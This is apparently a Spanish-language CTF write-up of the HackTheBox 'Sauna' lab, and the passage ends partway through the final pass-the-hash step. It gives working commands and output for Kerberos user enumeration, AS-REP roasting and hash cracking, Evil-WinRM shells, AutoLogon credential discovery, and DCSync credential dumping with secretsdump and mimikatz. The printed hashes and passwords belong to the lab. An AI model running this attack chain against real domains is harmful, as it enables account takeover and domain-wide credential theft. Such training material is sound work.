---
title: HackTheBox Sauna Writeup
published: true
---

Sauna fue una excelente oportunidad para experimentar con los conceptos de Windows Active Directory, todo en un formato de dificultad fácil. Empezaré usando un ataque de fuerza bruta de Kerberoast sobre nombres de usuario para identificar a algunos usuarios, y luego descubriré que uno de ellos tiene la bandera activada para poder obtener su hash sin autenticarse en el dominio. Usaré AS-REP Roast para obtener el hash, descifrarlo y obtener un shell. Encontraré las credenciales del siguiente usuario en la clave de registro de inicio de sesión automático. BloodHound mostrará que el usuario tiene privilegios que le permiten realizar un ataque de sincronización de controlador de dominio, que proporciona todos los hashes del dominio, incluidos los de los administradores, que usaré para obtener un shell.


![Captura de pantalla de la web](assets/images/Sauna/imagen1.png)





# [](#header-1)Reconocimiento

nmap muestra 20 puertos TCP abiertos que son típicos de un servidor Windows y probablemente un controlador de dominio:


```nmap
root@kali# nmap -p- --min-rate 10000 10.10.10.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-15 14:11 EST 
Nmap scan report for 10.10.10.175
Host is up (0.027s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE                    
53/tcp    open  domain 
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds                          
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP              
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49681/tcp open  unknown
64471/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 33.29 seconds

root@kali# nmap -p 53,80,88,135,139,389,445,464,593,3268,3269,5985 -sC -sV -oA scans/tcpscripts 10.10.10.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-15 14:20 EST
Nmap scan report for 10.10.10.175
Host is up (0.046s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-16 03:21:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=2/15%Time=5E4844A2%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m40s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-02-16T03:24:01
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 244.38 seconds
```

La versión del servidor IIS sugiere que se trata de una máquina con Windows 10/Server 2016/Server 2019.

Los scripts LDAP muestran un nombre de dominio de EGOTISTICAL-BANK.LOCAL0. Lo analizaré con más detalle.

# [](#header-1)Sitio web - TCP 80
## [](#header-2)Sitio

La página representa un banco:


![Captura de pantalla de la web](assets/images/Sauna/imagen2-1.png)

Con solo navegar, no se ve nada interesante. Todas las páginas son estáticas y los formularios no funcionan. No hay mucho que aportar. En la página "Sobre nosotros", hay una lista del equipo:

![Captura de pantalla de la web](assets/images/Sauna/imagen3.webp)

Tomé nota de esto en caso de que quisiera forzar algo más tarde, pero no lo necesité.

## [](#header-2)Directorio de fuerza bruta

Mientras miraba el sitio, también estaba gobuster corriendo, pero tampoco encontré nada interesante:

```Fuzz
root@kali# gobuster dir -u http://10.10.10.175/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-root -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.175/
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/15 14:15:03 Starting gobuster
===============================================================
/images (Status: 301)
/Images (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/IMAGES (Status: 301)
/Fonts (Status: 301)
/CSS (Status: 301)
===============================================================
2020/02/15 14:22:17 Finished
===============================================================

```

## [](#header-2)SMB - TCP 445

Probaré conexiones anónimas a los recursos compartidos SMB, pero no tengo éxito:

```shell
    root@kali# smbmap -H 10.10.10.175
    [+] Finding open SMB ports....
    [+] User SMB session established on 10.10.10.175...
    [+] IP: 10.10.10.175:445        Name: 10.10.10.175                                      
            Disk                                                    Permissions     Comment
            ----                                                    -----------     -------
    [!] Access Denied

    root@kali# smbclient -N -L //10.10.10.175
    Anonymous login successful

            Sharename       Type      Comment
            ---------       ----      -------
    smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.175]
    Error returning browse list: NT_STATUS_REVISION_MISMATCH
    Reconnecting with SMB1 for workgroup listing.
    do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
    Failed to connect with SMB1 -- no workgroup available

```

## [](#header-2)LDAP - TCP/UDP 389

El nmapscript realizó una enumeración básica y devolvió el dominio EGOTISTICAL-BANK.LOCAL0. Profundizaré un poco más con ldapsearch.

Primero la consulta para obtener la base del dominio es ldapsearch -x -h 10.10.10.175 -s base namingcontexts, donde:

* -x- autenticación simple
* -h 10.10.10.175- host para realizar la consulta
* -s base- establecer el alcance en la basenaming contexts- devolver contextos de nombres
Esto da el dominio EGOTISTICAL-BANK.LOCAL,:


```shell
root@kali# ldapsearch -x -h 10.10.10.175 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Ahora puedo usar -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'para obtener información sobre el dominio:

```shell
root@kali# ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL                      
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20200216124516.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
...[snip]...

```

Hay mucha información ahí, pero al final no la utilicé.


## [](#header-2)DNS - TCP/UDP 53
Siempre que veo DNS, vale la pena intentar una transferencia de zona. Ambos sauna.htbno egotistical-bank.local devolvieron nada:


```shell

root@kali# dig axfr @10.10.10.175 sauna.htb
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.175 sauna.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

root@kali# dig axfr @10.10.10.175 egotistical-bank.local
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.175 egotistical-bank.local
; (1 server found)
;; global options: +cmd
; Transfer failed.

```

## [](#header-2)Kerberos - UDP (y TCP) 88

Sin credenciales, algo que puedo comprobar en Kerberos es el ataque de fuerza bruta contra nombres de usuario. Usaré Kerbrute para probarlo y encuentra cuatro nombres de usuario únicos:

```shell
──(jorge㉿kali)-[~/…/maquinas/Windows/Sauna/kerbrute]
└─$ ./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/16/25 - Ronnie Flathers @ropnop

2025/06/16 10:41:12 >  Using KDC(s):
2025/06/16 10:41:12 >   10.10.10.175:88

2025/06/16 10:41:57 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2025/06/16 10:45:26 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2025/06/16 10:45:53 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2025/06/16 10:47:55 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:db2f983713fb37a2d34808499a5d7ea8$376f1825491de619885beeb28841619ea1a8f7e6dba011917b44f9d79cd097437d18393429fb406ec9b42be234987898b7a3875d29d669cc357ab845e959c1a88c5957689402c86cba7233e31bbf9e37f40205cd6cf9eb2793ef04ef3344ca03e11f0055f9a5f2a0be2438e1e9d34d31928dc6472f72053970e687e01c295f26cdd3bd8473429e542fe59b9eba5b15cc3063b6e97226484c7b6474e97705271dacbd26ce5c71a02b09d19fdf3a974a1ade90a3ac4f072db21a656cfb9c5959f468ed57cca470eda98627044ba8da8426651bece8c98b235184073b1b9aa1081940c34f7e03c38a239430ef4d543d9d5782585b7ef20bb1ddab946b0f7484d2268d1ec01bc99c4a35324b18018e6a1f7fb7f1f733efb5                                                                                             
2025/06/16 10:47:55 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
```

Es probable que fsmith sea Fergus Smith:

![Captura de pantalla de la web](assets/images/Sauna/imagen4.webp)


Usé una lista de nombres de usuario de Seclists para hacer el análisis bruto y ver si surgía algo antes de intentar convertir los nombres de la página del equipo a un formato. En un CTF, tiene sentido probar primero con una lista amplia, ya que es más fácil y no importa el ruido. Si fuera una empresa real, probablemente probaría con variaciones de los nombres o buscaría en redes sociales un correo electrónico corporativo para que los empleados consiguieran primero el formato de nombre de usuario.

Hice una lista de los demás usuarios en el mismo formato [first initial][lastname]:


- fsmith
- scoins
- sdriver
- btayload
- hbear
- skerb



Lo ejecuté kerbrute, pero ninguno de los otros usuarios existe.


# [](#header-1)Shell como fsmith
## [](#header-2)Antecedentes del tostado AS-REP

m0chan tiene una excelente publicación sobre cómo atacar Kerberos que incluye el Roasting AS-REP. Normalmente, al intentar solicitar autenticación mediante Kerberos, el solicitante debe autenticarse primero en el controlador de dominio (DC). Sin embargo, existe una opción DONT_REQ_PREAUTHmediante la cual el DC simplemente envía el hash a un usuario no autenticado. El Roasting AS-REP verifica si algún usuario conocido tiene esta opción activada.

## [](#header-2)Obtener hash
Usaré la lista de usuarios que recopilé de Kerbrute y la ejecutaré GetNPUsers.pypara buscar usuarios vulnerables. Tres de ellos aparecen como no vulnerables, pero uno proporciona un hash:

```shell
root@kali# GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set

root@kali# cat hashes.aspreroast 
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a89b6e78741dfb23312bc04c1892e558$a9aff5e5a5080949e6e4f4bbd690230277b586e7717b3328a80b636872f77b9deb765e5e6fab3c51b4414452bc4d4ad4a1705b2c5c42ea584bfe170fa8f54a89a095c3829e489609d74fd10a124dbf8445a1de2ed213f4682a679ab654d0344ff869b959c79677790e99268944acd41c628e70491487ffb6bcef332b74706ccecf70f64af110897b852d3a8e7b3e55c740c879669481115685915ec251e0316b682a5ca1c77b5294efae72d3642117d84429269f5eaea23c3b01b6beaf59c63ffaf5994e180e467de8675928929b754db7fc8c7e773da473649af149def29e5ffb5f94b5cb7912b68ccbee741b6e205ce8388d973b9b59cf7c8606de4bb149c0

```

## [](#header-2)Crack Hash

Ahora solo necesito pasar esto a hashcatcrackear y funciona :

```shell
root@kali# hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...
...[snip]...
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a89b6e78741dfb23312bc04c1892e558$a9aff5e5a5080949e6e4f4bbd690230277b586e7717b3328a80b636872f77b9deb765e5e6fab3c51b4414452bc4d4ad4a1705b2c5c42ea584bfe170fa8f54a89a095c3829e489609d74fd10a124dbf8445a1de2ed213f4682a679ab654d0344ff869b959c79677790e99268944acd41c628e70491487ffb6bcef332b74706ccecf70f64af110897b852d3a8e7b3e55c740c879669481115685915ec251e0316b682a5ca1c77b5294efae72d3642117d84429269f5eaea23c3b01b6beaf59c63ffaf5994e180e467de8675928929b754db7fc8c7e773da473649af149def29e5ffb5f94b5cb7912b68ccbee741b6e205ce8388d973b9b59cf7c8606de4bb149c0:Thestrokes23
...[snip]...

```

Devuelve la contraseña, Thestrokes23.

## [](#header-2)Evil-WinRM

Si no tuviera instalado Evil-WinRM , podría instalarlo con gem install evil-winrm. Ahora lo usaré para obtener un shell:

```shell

root@kali# evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

Y obtén user.txt:

```shell
*Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt
1b5520b9************************
```

# [](#header-1)Privado: fsmith –> svc_loanmgr
## [](#header-2)Enumeración

Para la enumeración de Windows, ejecutaré WinPEAS.exedesde la suite de scripts Awesome para escalada de privilegios . Guardaré una copia en una carpeta y luego crearé un recurso compartido SMB con smbserver.py:

```shell
root@kali# smbserver.py -username df -password df share . -smb2support
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Ahora puedo montar el recurso compartido desde Sauna e ir a ese directorio:

```shell
*Evil-WinRM* PS C:\> net use \\10.10.14.30\share /u:df df
The command completed successfully.
*Evil-WinRM* PS C:\> cd \\10.10.14.30\share\
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share>
```

Lo ejecutaré winPEAS.exede tal manera que los resultados se escriban en el recurso compartido:

```shell
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share> .\winPEAS.exe cmd fast > sauna_winpeas_fast
```

Al analizar los resultados, las credenciales de AutoLogon resultaron interesantes:

```shell
  [+] Looking for AutoLogon credentials(T1012)
Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!   

```

## [](#header-2)Evil-WinRM

Al ejecutar net userel cuadro se mostró que no había ningún usuario svc_loanmanager:

```shell
*Evil-WinRM* PS C:\> net user

User accounts for \\                                  

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.

```


Pero svc_loanmgr está bastante cerca.

Probaré las credenciales con ese usuario y funciona:


```shell
root@kali# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v2.1

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>

```

# [](#header-1)Priv: svc_loanmgr –> root

## [](#header-2)Ejecute SharpHound.exe

Antes de poder analizar en BloodHound, necesito recopilar algunos datos. Los tomaré SharpHound.exede la carpeta injectors y haré una copia en mi recurso compartido SMB. Luego, puedo ejecutarlo directamente desde allí, y la salida también se escribirá en el recurso compartido:

```shell
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share> .\SharpHound.exe
-----------------------------------------------
Initializing SharpHound at 6:36 PM on 2/16/2020
-----------------------------------------------
                                                      
Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain EGOTISTICAL-BANK.LOCAL using path CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL  
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 19 MB RAM
Status: 60 objects finished (+60 30)/s -- Using 26 MB RAM
Enumeration finished in 00:00:02.1309648       
Compressing data to .\20200216183650_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 6:36 PM on 2/16/2020! Happy Graphing!
```

## [](#header-2)Analizar resultados


Importaré el .ziparchivo a BloodHound haciendo clic en el botón "Subir datos" en la esquina superior derecha. El sistema informa que la operación se ha realizado correctamente, dejándome en blanco. Hay consultas predefinidas que podrían ser útiles, pero prefiero empezar con los usuarios a los que ya tengo acceso. Buscaré SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL en la barra superior izquierda y aparecerá en el gráfico. A la izquierda, buscaré "Control de objetos de salida": estos son los elementos sobre los que este usuario tiene permisos. En este caso, hay uno:

![Captura de pantalla de la web](assets/images/Sauna/imagen5.webp)

Al hacer clic en el “1”, agrega ese elemento al gráfico:

![Captura de pantalla de la web](assets/images/Sauna/imagen6.webp)

Esta cuenta tiene acceso al GetChangesdominio GetChangesAll. Buscarlo en Google mostrará rápidamente una lista de artículos sobre el ataque DCSync, o puedo hacer clic derecho en la etiqueta (debes estar en el lugar correcto) y abrir el menú:

![Captura de pantalla de la web](assets/images/Sauna/imagen7.webp)

Al hacer clic en ayuda, aparece una pestaña de Información de abuso que incluye instrucciones sobre cómo abusar de este privilegio:

![Captura de pantalla de la web](assets/images/Sauna/imagen8.webp)


## [](#header-1)Sincronización DC
## [](#header-2)basurero de secretos

Mi método preferido para ejecutar un ataque DCSync es usar secretsdump.py, lo que me permite ejecutarlo desde mi equipo Kali, siempre que pueda comunicarme con el controlador de dominio en TCP 445 y 135 y un puerto RPC alto. Esto evita tener que lidiar con antivirus, aunque genera tráfico de red.

Necesito darle solo una cadena de destino en el formato [username]:[password]@[ip]:

```shell
root@kali# secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:a90968c91de5f77ac3b7d938bd760002373f71e14e1a027b2d93d1934d64754a
SAUNA$:aes128-cts-hmac-sha1-96:0bf0c486c1262ab6cf46b16dc3b1b198
SAUNA$:des-cbc-md5:b989ecc101ae4ca1
[*] Cleaning up... 

```

## [](#header-2)Mimikatz

También puedo usar Mimikatz como sugirió BloodHound. Descargaré la última versión desde la página de lanzamiento y subiré el binario de 64 bits a Sauna:

```shell
*Evil-WinRM* PS C:\programdata> upload /opt/mimikatz/x64/mimikatz.exe    
Info: Uploading /opt/mimikatz/x64/mimikatz.exe to C:\programdata\mimikatz.exe

                                                                         
Data: 1685172 bytes of 1685172 bytes copied
                                                                         
Info: Upload successful! 

```

Mimikatz puede ser muy quisquilloso. Idealmente, puedo ejecutarlo y acceder a una consola de Mimikatz, pero por alguna razón en Sauna, empezó a mostrarme el prompt repetidamente y tuve que cerrar la sesión. Siempre es más seguro ejecutarlo mimikatz.execon los comandos que quieres ejecutar después de la línea de comandos.


```shell
*Evil-WinRM* PS C:\programdata> .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)           
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 

mimikatz(commandline) # lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'administrator' will be the user account
                                                                         
Object RDN           : Administrator    
                                                                         
** SAM ACCOUNT **                                                        
                                                                         
SAM Username         : Administrator    
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :                                                   
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500                                               
                                                                         
Credentials:                                                             
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211
                                                                         
Supplemental Credentials:                                                
* Primary:NTLM-Strong-NTOWF *                                            
    Random Value : caab2b641b39e342e0bdfcd150b1683e
                                                                         
* Primary:Kerberos-Newer-Keys *                                          
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096                                            
    Credentials
...[snip]...

```
o tambien lo podemos hacer de esta forma utilizando secretsdumpº :

```shell
┌──(jorge㉿kali)-[~/Documentos/Maquinas/Windows/Sauna]
└─$ impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:1700c5777cacdc8998667cd8f6f8901d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:53739cd784c6c2f79ef6a7379752adf7afe6cecd7dc303db194f848ccf3926e3
SAUNA$:aes128-cts-hmac-sha1-96:5c20ffacf35b1cfa3b3160c354a8a0de
SAUNA$:des-cbc-md5:94fd13d51f685bab
[*] Cleaning up... 
                                                                                                                                    

```

# [](#header-1)Root

Puedo usar el hash de administrador en WMI para obtener un shell como administrador:

```shell
root@kali# wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
